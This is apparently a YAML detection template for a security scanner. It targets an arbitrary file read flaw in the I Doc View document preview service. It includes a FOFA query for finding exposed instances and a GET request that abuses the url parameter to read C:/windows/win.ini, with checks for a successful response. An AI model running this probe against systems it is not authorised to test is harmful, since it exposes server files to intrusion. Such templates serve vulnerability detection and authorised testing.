id: idocview-fileread

info:
  name: I Doc View任意文件读取漏洞
  author: Wen
  severity: high
  verified: true
  description: |-
    fofa: title=="在线文档预览 - I Doc View"
  tags: idocview,fileread
  created: 2023/12/27

rules:
  r0:
    request:
      method: GET
      path: /doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name=test.txt
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'"srcUrl":')  && 
      response.body.bcontains(b'"/data/test/') &&
      response.body.bcontains(b'"ext":')
expression: r0()
